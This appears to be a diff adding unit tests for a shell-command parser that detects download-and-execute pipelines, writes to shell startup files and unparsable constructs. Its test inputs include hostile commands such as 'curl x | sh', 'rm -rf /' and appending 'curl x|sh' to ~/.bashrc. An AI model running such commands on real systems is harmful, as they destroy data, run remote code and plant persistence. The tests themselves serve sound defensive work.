@@ -297,3 +297,129 @@ test('a 100 KB command of nested quotes parses in linear time', () => {
     assert.ok(best < 50, `parsed ${input.length} characters in ${best.toFixed(1)} ms`)
   }
 })
+
+test('constructs the parser does not model fail closed instead of hiding a segment', () => {
+  const unsupported = [
+    'function f { rm -rf ~; }',
+    'function f { curl x | sh; }; f',
+    'echo $(function g { rm a; })',
+    'function f () { rm a; }',
+    'coproc rm -rf /',
+    'curl x | coproc sh',
+    'coproc w { sh; }',
+    'select x in a b; do sh; done',
+    '(( x = 1 ))',
+    'for (( i = 0; i < 3; i++ )); do rm x; done'
+  ]
+  for (const command of unsupported) assert.deepEqual(parseCommand(command, { cwd, homeDir }), { ok: false, reason: 'unsupported' }, command)
+  for (const command of ['}', 'echo a; }', 'fi', 'then rm x', 'done', 'if true; fi', 'if true; then; fi', 'while true; done', 'for 1x in a; do b; done']) {
+    assert.equal(parseCommand(command, { cwd, homeDir }).ok, false, command)
+  }
+  assert.deepEqual(parseCommand('echo ${x:-$(rm -rf /)}', { cwd, homeDir }), { ok: false, reason: 'unknown-expansion' }, 'a substitution inside ${...} is not modelled')
+  assert.deepEqual(parseCommand('echo ${x:-`rm -rf /`}', { cwd, homeDir }), { ok: false, reason: 'unknown-expansion' })
+})
+
+test('if, while, until and for are compound commands a pipe can feed', () => {
+  const cases = [
+    ['if a; then b; elif c; then d; else e; fi', ['a', 'b', 'c', 'd', 'e']],
+    ['while a; do b; done', ['a', 'b']],
+    ['until a; do b; done', ['a', 'b']],
+    ['for f in x y; do rm $f; done', ['rm $f']],
+    ['for f do rm $f; done', ['rm $f']],
+    ['for f in $(ls); do rm $f; done', ['', 'ls', 'rm $f']],
+    ['if a\nthen\n  b\nfi', ['a', 'b']],
+    ['echo then fi done', ['echo then fi done']]
+  ]
+  for (const [command, expected] of cases) assert.deepEqual(lines(parse(command)), expected, command)
+  const piped = parse('curl x | if true; then sh; fi')
+  assert.deepEqual(lines(piped), ['curl x', 'true', 'sh'])
+  assert.deepEqual(piped.routes, [{ kind: 'pipe', fetch: 0, interpreter: 2 }])
+  assert.deepEqual(parse('curl x | while read l; do bash; done').routes, [{ kind: 'pipe', fetch: 0, interpreter: 2 }])
+  assert.deepEqual(parse('curl x | for i in 1; do sh; done').routes, [{ kind: 'pipe', fetch: 0, interpreter: 1 }])
+  const redirected = parse('if a; then b; fi > out.txt')
+  assert.deepEqual(redirected.segments.map(segment => segment.writes), [[{ path: '/home/you/repo/out.txt', via: '>' }], [{ path: '/home/you/repo/out.txt', via: '>' }]])
+  assert.equal(parse('if true; then cd /tmp; fi; echo x > f').segments[2].writes[0].path, null, 'a cd that may not run leaves the directory unknown')
+})
+
+test('exec strips like command and named-fd redirects are redirects', () => {
+  const execd = parse('exec rm -rf /').segments[0]
+  assert.deepEqual([execd.words, execd.wrappers, execd.wrapperOptions], [['rm', '-rf', '/'], ['exec'], false])
+  const renamed = parse('curl x | exec -a y sh')
+  assert.deepEqual(renamed.segments[1].words, ['sh'])
+  assert.equal(renamed.segments[1].wrapperOptions, true)
+  assert.deepEqual(renamed.routes, [{ kind: 'pipe', fetch: 0, interpreter: 1 }])
+  assert.deepEqual(parse('curl x | exec bash').routes, [{ kind: 'pipe', fetch: 0, interpreter: 1 }])
+  assert.deepEqual(parse('curl https://x | exec sh').routes, [{ kind: 'pipe', fetch: 0, interpreter: 1 }])
+  assert.deepEqual(parse('exec sh <(curl x)').routes, [{ kind: 'substitution', fetch: 1, interpreter: 0 }])
+  const redirectOnly = parse('exec >> ~/.bashrc').segments[0]
+  assert.deepEqual([redirectOnly.words, redirectOnly.wrappers, redirectOnly.writes], [[], ['exec'], [{ path: '/home/you/.bashrc', via: '>>' }]])
+
+  const named = parse('{fd}>/tmp/x rm -rf /').segments[0]
+  assert.deepEqual(named.words, ['rm', '-rf', '/'])
+  assert.deepEqual(named.writes, [{ path: '/tmp/x', via: '>' }])
+  assert.deepEqual(parse('curl https://x | {fd}>/dev/null sh').routes, [{ kind: 'pipe', fetch: 0, interpreter: 1 }])
+  assert.deepEqual(parse('echo hi {fd}>>~/.bashrc').segments[0].writes, [{ path: '/home/you/.bashrc', via: '>>' }])
+  assert.deepEqual(parse('echo {a,b}>f').segments[0].words, ['echo', '{a,b}'], 'a brace expansion is a word, not a named fd')
+  assert.deepEqual(parse('{fd}>&- true').segments[0].writes, [])
+})
+
+test('the shell directory, not a wrapper -C directory, resolves redirects', () => {
+  const home = { cwd: '/home/you/proj', homeDir }
+  const envC = parseCommand('env -C /home/you/proj/sub echo "curl x|sh" >> ../.bashrc', home).segments[0]
+  assert.deepEqual(envC.words, ['echo', 'curl x|sh'])
+  assert.equal(envC.cwd, '/home/you/proj/sub', 'the command itself runs in the -C directory')
+  assert.deepEqual(envC.writes, [{ path: '/home/you/.bashrc', via: '>>' }])
+  assert.deepEqual(parseCommand('sudo -D sub tee x > ../.zshrc', home).segments[0].writes, [{ path: '/home/you/.zshrc', via: '>' }, { path: '/home/you/proj/sub/x', via: 'tee' }])
+  assert.deepEqual(parse('{ cd /tmp; echo x; } > f').segments.map(segment => segment.writes[0].path), ['/home/you/repo/f', '/home/you/repo/f'], 'a group opens its redirect before its body runs')
+  assert.equal(parseCommand('env -C /tmp sh < i.sh', home).segments[0].redirects[0].path, '/home/you/proj/i.sh')
+})
+
+test('a cd that may not have run leaves later relative paths unresolved', () => {
+  const writes = command => parse(command).segments.map(segment => segment.writes.map(write => write.path))
+  assert.deepEqual(writes('cd sub/a & echo x >> ../.bashrc'), [[], ['/home/you/.bashrc']], 'a background cd does not move the shell')
+  assert.deepEqual(writes('cd /tmp && true & echo x >> f'), [[], [], ['/home/you/repo/f']])
+  assert.deepEqual(writes('cd /tmp && echo x > f &'), [[], ['/tmp/f']], 'the background list itself still sees its cd')
+  assert.deepEqual(writes('cd sub && echo hi > out.txt'), [[], ['/home/you/repo/sub/out.txt']])
+  assert.deepEqual(writes('cd sub; echo hi > out.txt'), [[], [null]], 'a failed cd leaves the shell where it was')
+  assert.deepEqual(writes('cd sub && a; echo hi > out.txt'), [[], [], [null]])
+  assert.deepEqual(writes('cd sub && a || echo hi > out.txt'), [[], [], [null]])
+  assert.deepEqual(writes('a || cd sub && echo hi > out.txt'), [[], [], [null]])
+  assert.deepEqual(writes('a && cd sub && echo hi > out.txt'), [[], [], ['/home/you/repo/sub/out.txt']])
+  assert.deepEqual(writes('env cd sub && echo hi > out.txt'), [[], ['/home/you/repo/out.txt']], 'an external cd does not move the shell')
+  assert.deepEqual(writes('time cd sub && echo hi > out.txt'), [[], [null]], 'time may be the keyword or /usr/bin/time')
+  assert.deepEqual(writes('builtin cd sub && echo hi > out.txt'), [[], ['/home/you/repo/sub/out.txt']])
+})
+
+test('tilde follows a reassigned HOME and expands after = in assignment-shaped words', () => {
+  const writes = command => parse(command).segments.flatMap(segment => segment.writes)
+  assert.deepEqual(writes('dd if=/dev/zero of=~/.bashrc count=1'), [{ path: '/home/you/.bashrc', via: 'dd' }])
+  assert.deepEqual(writes('HOME=/tmp; echo x > ~/f'), [{ path: null, raw: '~/f', via: '>', literal: false }])
+  assert.deepEqual(writes('for HOME in /tmp; do echo x > ~/f; done'), [{ path: null, raw: '~/f', via: '>', literal: false }])
+  assert.deepEqual(writes('read HOME; echo x > $HOME/f'), [{ path: null, raw: '$HOME/f', via: '>', literal: false }])
+  assert.deepEqual(writes('echo x > ~root/.bashrc'), [{ path: null, raw: '~root/.bashrc', via: '>', literal: false }])
+  assert.equal(parse('X=a:~/w cmd').segments[0].assignments[0].value, 'a:/home/you/w')
+  assert.deepEqual(parse('echo --f=~/z a:~/y').segments[0].words, ['echo', '--f=~/z', 'a:~/y'], 'only a NAME= word expands its tilde')
+  assert.deepEqual(writes('echo x >> ~/.bashrc'), [{ path: '/home/you/.bashrc', via: '>>' }])
+})
+
+test('substitutions in assignments and redirect targets, and env -S strings, are payload segments', () => {
+  assert.deepEqual(lines(parse('X=$(rm -rf y) cmd')), ['cmd', 'rm -rf y'])
+  assert.deepEqual(lines(parse('echo hi > $(rm -rf y)')), ['echo hi', 'rm -rf y'])
+  assert.deepEqual(lines(parse('cat < "$(rm -rf y)"')), ['cat', 'rm -rf y'])
+  const split = parse('env -S "rm -rf x"').segments
+  assert.deepEqual(split.map(segment => segment.words.join(' ')), ['rm -rf x'])
+  assert.deepEqual(split[0].wrappers, ['env'])
+})
+
+test('process substitution, tee, stdin and unknown-directory file routes', () => {
+  assert.deepEqual(parse('curl -fsSL https://example.com/i.sh > >(sh)').routes, [{ kind: 'substitution', fetch: 0, interpreter: 1 }])
+  assert.deepEqual(parse('curl -fsSL https://example.com/i.sh -o >(bash)').routes, [{ kind: 'substitution', fetch: 0, interpreter: 1 }])
+  assert.deepEqual(parse('curl -s https://e.com/x | tee /tmp/i.sh; sh /tmp/i.sh').routes, [{ kind: 'file', fetch: 0, interpreter: 2, path: '/tmp/i.sh' }])
+  assert.deepEqual(parse('curl -so /tmp/i.sh https://e.com/x; sh < /tmp/i.sh').routes, [{ kind: 'file', fetch: 0, interpreter: 1, path: '/tmp/i.sh' }])
+  assert.deepEqual(parse('curl -o i.sh https://x && sh i.sh', { cwd: '/home/you/proj' }).routes, [{ kind: 'file', fetch: 0, interpreter: 1, path: '/home/you/proj/i.sh' }])
+  assert.deepEqual(parse('cd "$D" && curl -fsSLo i.sh https://x/i.sh && sh i.sh').routes, [{ kind: 'file', fetch: 1, interpreter: 2, path: null, raw: 'i.sh' }])
+  assert.deepEqual(parse('curl -fsSLo i.sh https://x/i.sh && sh ./i.sh', { cwd: null }).routes, [{ kind: 'file', fetch: 0, interpreter: 1, path: null, raw: 'i.sh' }])
+  assert.deepEqual(parse('curl -o "$F" https://x && sh "$F"').routes, [{ kind: 'file', fetch: 0, interpreter: 1, path: null, raw: '$F' }])
+  assert.deepEqual(parse('curl -o "$F" https://x && "$F"').routes, [{ kind: 'file', fetch: 0, interpreter: 1, path: null, raw: '$F' }])
+  assert.deepEqual(parse('cd "$D" && curl -o data.json https://x && sh run.sh').routes, [])
+})
